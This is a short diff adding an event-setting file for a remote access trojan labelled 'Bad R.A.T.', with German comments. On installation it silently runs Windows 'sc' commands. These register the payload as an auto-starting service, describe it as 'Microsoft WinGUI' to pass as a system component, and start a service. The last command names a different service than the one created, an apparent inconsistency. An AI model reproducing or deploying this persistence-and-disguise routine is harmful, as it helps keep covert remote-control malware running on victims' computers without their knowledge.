@@ -1,0 +1,9 @@
+;Event Setting [Bad R.A.T.]
+;by Mr Hawk
+;THX to heroin
+
+;Startet Server als Service (Methode 2)
+
+OnInstallation: StartPath_Hide sc create "WinGUI" binpath= "[%APP]" start= auto "gui.exe" /service
+OnInstallation: StartPath_Hide sc description WinGUI "Microsoft WinGUI"
+OnInstallation: StartPath_Hide sc start WMI-Client
